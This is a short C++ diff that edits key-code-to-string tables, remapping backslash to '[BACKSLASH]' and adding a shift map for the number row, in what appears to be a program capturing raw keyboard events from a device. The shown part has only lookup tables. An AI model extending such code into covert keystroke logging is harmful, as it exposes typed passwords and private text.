@@ -55,7 +55,8 @@ std::unordered_map<__u16, std::string> keyMap = {
     {KEY_SEMICOLON, ";"},
     {KEY_APOSTROPHE, "'"},
     {KEY_GRAVE, "`"},
-    {KEY_BACKSLASH, "\\"},
+    // {KEY_BACKSLASH, "\\"},
+    {KEY_BACKSLASH, "[BACKSLASH]"},
     {KEY_COMMA, ","},
     {KEY_DOT, "."},
     {KEY_SLASH, "/"},
@@ -153,6 +154,19 @@ std::unordered_map<__u16, std::string> keyMap = {
     {KEY_PAUSE, "[PAUSE]"},
     {KEY_MENU, "[MENU]"},
     {KEY_COMPOSE, "[COMPOSE]"}
+};
+
+std::unordered_map<__u16, std::string> shiftKeyMap {
+    {KEY_1, "!"},
+    {KEY_2, "@"},
+    {KEY_3, "#"},
+    {KEY_4, "$"},
+    {KEY_5, "%"},
+    {KEY_6, "^"},
+    {KEY_7, "&"},
+    {KEY_8, "*"},
+    {KEY_9, "("},
+    {KEY_0, ")"},
 };
 
 void captureEvents(std::string &kbd_device){
